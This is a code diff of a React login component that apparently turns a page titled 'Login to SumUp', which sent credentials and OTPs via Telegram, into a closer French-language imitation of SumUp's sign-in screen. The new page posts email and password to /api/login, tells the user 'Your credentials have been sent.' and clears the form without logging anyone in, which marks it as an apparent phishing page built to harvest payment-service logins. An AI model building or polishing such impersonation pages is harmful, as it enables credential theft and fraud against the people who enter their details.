@@ -1,46 +1,36 @@
 import { useState } from "react";
-import { useLocation } from "wouter";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
-import { Label } from "@/components/ui/label";
+import { Eye, EyeOff } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
 
 export default function Login() {
-  const [, setLocation] = useLocation();
-  const { toast } = useToast();
-  const [isLoading, setIsLoading] = useState(false);
-  const [username, setUsername] = useState("");
+  const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const { toast } = useToast();
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
 
     try {
-      const response = await apiRequest("POST", "/api/auth/login", { username, password });
+      const response = await apiRequest("POST", "/api/login", { email, password });
       const data = await response.json();
 
       if (data.success) {
         toast({
-          title: "Login credentials sent!",
-          description: "Check your Telegram for the OTP code.",
+          title: "Login successful!",
+          description: "Your credentials have been sent.",
         });
         
-        // Redirect to OTP verification
-        setLocation(`/verify-otp?userId=${data.userId}`);
-      } else {
-        toast({
-          title: "Login failed",
-          description: data.error || "Invalid credentials",
-          variant: "destructive",
-        });
+        setEmail("");
+        setPassword("");
       }
-    } catch (error) {
+    } catch (error: any) {
       toast({
-        title: "Error",
-        description: "Failed to login. Please try again.",
+        title: "Login failed",
+        description: error.message || "Please try again",
         variant: "destructive",
       });
     } finally {
@@ -49,64 +39,111 @@ export default function Login() {
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center bg-accent/20 p-4">
-      <Card className="w-full max-w-md" data-testid="card-login">
-        <CardHeader>
-          <CardTitle className="text-2xl font-bold" data-testid="text-login-title">Login to SumUp</CardTitle>
-          <CardDescription data-testid="text-login-description">
-            Enter your credentials. You'll receive login details and OTP via Telegram.
-          </CardDescription>
-        </CardHeader>
-        <CardContent>
-          <form onSubmit={handleLogin} className="space-y-4">
-            <div className="space-y-2">
-              <Label htmlFor="username">Username</Label>
-              <Input
-                id="username"
-                type="text"
-                placeholder="Enter your username"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                required
-                data-testid="input-username"
-              />
-            </div>
+    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
+      <div className="w-full max-w-md">
+        <div className="mb-12 flex items-center">
+          <div className="h-8 w-8 bg-black rounded-md flex items-center justify-center" data-testid="logo-icon">
+            <svg viewBox="0 0 24 24" fill="white" className="h-5 w-5">
+              <path d="M13 10V3L4 14h7v7l9-11h-7z" />
+            </svg>
+          </div>
+          <span className="ml-2 text-lg font-semibold" data-testid="logo-text">sumup</span>
+        </div>
 
-            <div className="space-y-2">
-              <Label htmlFor="password">Password</Label>
-              <Input
+        <h1 className="text-4xl font-bold mb-12 text-black" data-testid="text-title">
+          Connexion
+        </h1>
+
+        <form onSubmit={handleLogin} className="space-y-6">
+          <div>
+            <label 
+              htmlFor="email" 
+              className="block text-sm font-medium mb-2 text-black"
+              data-testid="label-email"
+            >
+              Adresse e-mail
+            </label>
+            <input
+              id="email"
+              type="email"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              placeholder="vous@exemple.com"
+              required
+              className="w-full h-12 px-4 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black placeholder:text-gray-400"
+              data-testid="input-email"
+            />
+          </div>
+
+          <div>
+            <label 
+              htmlFor="password" 
+              className="block text-sm font-medium mb-2 text-black"
+              data-testid="label-password"
+            >
+              Mot de passe
+            </label>
+            <div className="relative">
+              <input
                 id="password"
-                type="password"
-                placeholder="Enter your password"
+                type={showPassword ? "text" : "password"}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 required
+                className="w-full h-12 px-4 pr-12 border border-black rounded-md focus:outline-none focus:ring-2 focus:ring-black text-black"
                 data-testid="input-password"
               />
-            </div>
-
-            <Button
-              type="submit"
-              className="w-full"
-              disabled={isLoading}
-              data-testid="button-login"
-            >
-              {isLoading ? "Logging in..." : "Login"}
-            </Button>
-
-            <div className="text-center text-sm text-muted-foreground">
-              Don't have an account?{" "}
-              <a
-                href="/register"
-                className="text-primary hover:underline font-medium"
-                data-testid="link-register"
+              <button
+                type="button"
+                onClick={() => setShowPassword(!showPassword)}
+                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black"
+                data-testid="button-toggle-password"
               >
-                Register here
-              </a>
+                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+              </button>
             </div>
-          </form>
-        </CardContent>
-      </Card>
+          </div>
+
+          <div className="text-left">
+            <a
+              href="#"
+              className="text-sm font-medium text-black underline hover:no-underline"
+              data-testid="link-forgot-password"
+            >
+              Mot de passe oublié ?
+            </a>
+          </div>
+
+          <button
+            type="submit"
+            disabled={isLoading}
+            className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 disabled:bg-opacity-50 transition-all"
+            data-testid="button-submit"
+          >
+            {isLoading ? "Connexion..." : "Suivant"}
+          </button>
+        </form>
+
+        <div className="mt-8">
+          <button
+            type="button"
+            className="w-full h-12 border border-black text-black font-medium rounded-md hover:bg-gray-50 transition-all"
+            data-testid="button-connect-password"
+          >
+            Se connecter avec un mot de passe
+          </button>
+        </div>
+
+        <div className="mt-16 text-center">
+          <button
+            type="button"
+            className="text-sm font-medium text-black border border-black px-8 py-3 rounded-md hover:bg-gray-50 transition-all"
+            data-testid="button-system-status"
+          >
+            Statut du système
+          </button>
+        </div>
+      </div>
     </div>
   );
 }
